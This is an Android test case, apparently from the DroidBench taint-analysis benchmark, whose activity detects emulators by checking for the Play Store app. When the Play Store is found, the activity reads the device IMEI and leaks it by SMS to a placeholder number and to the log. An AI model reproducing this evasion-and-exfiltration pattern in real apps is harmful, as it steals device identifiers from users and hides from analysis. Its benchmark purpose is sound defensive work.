package de.ecspride;

import java.util.List;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ResolveInfo;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.view.View;
import android.widget.Button;

/**
 * @testcase_name EmulatorDetection_PlayStore1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description Sends the IMEI as an SMS message and writes it to the log file. Emulator detection
 * 		is performed by checking whether the Play Store app is installed on the system.
 * @dataflow onCreate: imei -> SMS & Log 
 * @number_of_leaks 2
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS}, PackageManager.PERMISSION_GRANTED);

		((Button) findViewById(R.id.trigger)).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				final Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
				mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
				final List<ResolveInfo> pkgAppsList = getPackageManager().queryIntentActivities(mainIntent, 0);

				boolean found = false;
				for (ResolveInfo ri : pkgAppsList) {
					String pkgName = ri.activityInfo.applicationInfo.packageName;
					if (pkgName.startsWith("com.android.vending")) {
						found = true;
						break;
					}
				}

				if (found) {
					TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
					String imei = telephonyManager.getDeviceId(); //source

					SmsManager sm = SmsManager.getDefault();
					String number = "+49 1234";
					sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak

					Log.v("DROIDBENCH", imei);
				}
			}
		});
		

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {

		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}

}
